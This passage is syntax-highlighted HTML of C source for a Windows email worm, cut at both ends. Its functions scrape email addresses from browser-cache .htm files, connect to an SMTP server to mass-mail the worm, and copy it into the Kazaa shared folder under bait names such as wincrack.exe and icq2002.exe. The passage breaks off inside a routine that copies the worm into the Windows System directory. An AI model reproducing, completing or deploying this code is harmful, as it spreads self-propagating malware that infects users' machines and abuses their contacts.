 </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">34</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">58</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">32</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">62</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc4">63</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">emails</span><span class="sc10">[</span><span class="sc11">c</span><span class="sc10">][</span><span class="sc11">j</span><span class="sc10">]=</span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">j</span><span class="sc10">++;</span><span class="sc0">
  </span><span class="sc11">ik</span><span class="sc10">++;</span><span class="sc0">
  </span><span class="sc11">ch</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]=</span><span class="sc11">lin</span><span class="sc10">[</span><span class="sc11">ik</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">emails</span><span class="sc10">[</span><span class="sc11">c</span><span class="sc10">][</span><span class="sc11">j</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">get</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------FINDFILES---------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">findfiles</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Searches for .htm files in the temp. directories
</span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">f</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hf</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">pth1</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">pth2</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">pth3</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">pth</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">path</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc11">windir</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc6">"\\Temporary Internet Files\\*"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">hf</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,&amp;</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc10">==</span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">+</span><span class="sc11">FILE_ATTRIBUTE_SYSTEM</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">pth1</span><span class="sc10">,</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">20</span><span class="sc10">;}</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">,&amp;</span><span class="sc11">f</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc10">==</span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">+</span><span class="sc11">FILE_ATTRIBUTE_SYSTEM</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">pth1</span><span class="sc10">,</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">20</span><span class="sc10">;}</span><span class="sc0">
    </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc11">windir</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc6">"\\Temporary Internet Files\\"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc11">pth1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc6">"\\*"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">hf</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,&amp;</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc10">==</span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">+</span><span class="sc11">FILE_ATTRIBUTE_SYSTEM</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">pth3</span><span class="sc10">,</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">20</span><span class="sc10">;}</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">,&amp;</span><span class="sc11">f</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc10">==</span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">+</span><span class="sc11">FILE_ATTRIBUTE_SYSTEM</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">pth3</span><span class="sc10">,</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">20</span><span class="sc10">;}</span><span class="sc0">
    </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc11">windir</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc6">"\\Temporary Internet Files\\"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc11">pth1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc11">pth3</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">pth</span><span class="sc10">,</span><span class="sc11">pth2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pth</span><span class="sc10">,</span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,</span><span class="sc6">"\\*.htm"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">k</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">hf</span><span class="sc10">=</span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">pth2</span><span class="sc10">,&amp;</span><span class="sc11">f</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">,&amp;</span><span class="sc11">f</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">k</span><span class="sc10">&lt;</span><span class="sc4">70</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]!=</span><span class="sc7">'.'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc11">pth</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc11">f</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">findmail</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">k</span><span class="sc10">++;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------CONECT------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">conect</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Connects to a server using "Winsock"
</span><span class="sc0">
</span><span class="sc2">// Start up Winsock
</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc11">version</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">wsaData</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);}</span><span class="sc0">

</span><span class="sc2">// Store information about the server
</span><span class="sc11">LPHOSTENT</span><span class="sc0"> </span><span class="sc11">lpHostEntry</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">lpHostEntry</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">gethostbyname</span><span class="sc10">(</span><span class="sc11">server</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lpHostEntry</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">WSACleanup</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">connected</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc11">connected</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//This means we're connected
//Get important data
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">err</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//If we didn't run this allready and got an error
</span><span class="sc0">    </span><span class="sc11">findserver</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">findfiles</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">// Create the socket
</span><span class="sc11">theSocket</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">socket</span><span class="sc10">(</span><span class="sc11">AF_INET</span><span class="sc10">,</span><span class="sc11">SOCK_STREAM</span><span class="sc10">,</span><span class="sc11">IPPROTO_TCP</span><span class="sc10">);</span><span class="sc0">    
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">WSACleanup</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">connected</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">SOCKADDR_IN</span><span class="sc0"> </span><span class="sc11">saServer</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">saServer</span><span class="sc10">.</span><span class="sc11">sin_family</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">AF_INET</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">saServer</span><span class="sc10">.</span><span class="sc11">sin_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*((</span><span class="sc11">LPIN_ADDR</span><span class="sc10">)*</span><span class="sc11">lpHostEntry</span><span class="sc10">-&gt;</span><span class="sc11">h_addr_list</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">saServer</span><span class="sc10">.</span><span class="sc11">sin_port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">25</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">// Connect to the server
</span><span class="sc11">nRet</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">connect</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,(</span><span class="sc11">LPSOCKADDR</span><span class="sc10">)&amp;</span><span class="sc11">saServer</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">sockaddr</span><span class="sc10">));</span><span class="sc0">    
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nRet</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">WSACleanup</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">connected</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">nRet</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">,</span><span class="sc11">Buf</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">),</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">           
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nRet</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">SOCKET_ERROR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">WSACleanup</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">connected</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'4'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'5'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">err</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]==</span><span class="sc7">'2'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]==</span><span class="sc7">'2'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">Buf</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]==</span><span class="sc7">'0'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">sendmail</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//Close the connection
</span><span class="sc11">closesocket</span><span class="sc10">(</span><span class="sc11">theSocket</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">// Shutdown Winsock
</span><span class="sc11">WSACleanup</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------KAZAA-----------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">kazaa</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Makes a copy in the Kazaa "Shared Folder"
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">kaza</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">],</span><span class="sc11">kfile</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">][</span><span class="sc4">20</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">kpth</span><span class="sc10">[</span><span class="sc4">1024</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">kpthlen</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">kpth</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc2">//The filenames
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">kfile</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc6">"\\mirc6.exe"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">kfile</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc6">"\\winamp3.exe"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">kfile</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">],</span><span class="sc6">"\\wincrack.exe"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">kfile</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">],</span><span class="sc6">"\\icq2002.exe"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">//Get the path to Kazaa from the reg.
</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc6">"Software\\Kazaa\\Transfer"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"DlDir0"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">kpth</span><span class="sc10">,&amp;</span><span class="sc11">kpthlen</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">kpth</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]&gt;</span><span class="sc4">64</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">kpth</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]&lt;</span><span class="sc4">123</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">                        
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">kpth</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">kaza</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc11">kpth</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">kaza</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">time</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">5</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">kaza</span><span class="sc10">,</span><span class="sc11">kfile</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]);</span><span class="sc0">
 </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">4</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">kaza</span><span class="sc10">,</span><span class="sc11">kfile</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">3</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">kaza</span><span class="sc10">,</span><span class="sc11">kfile</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]);</span><span class="sc0">
   </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">()%</span><span class="sc4">2</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">kaza</span><span class="sc10">,</span><span class="sc11">kfile</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc11">kaza</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------INFECTWIN-------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">infectwin</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Makes copies of the worm in %WinDir%\System\winsys*.exe
</span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">val</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">rnd</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc11">windir</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc6">"\\System\\winsys"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">time</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">);</span><span class="sc0">
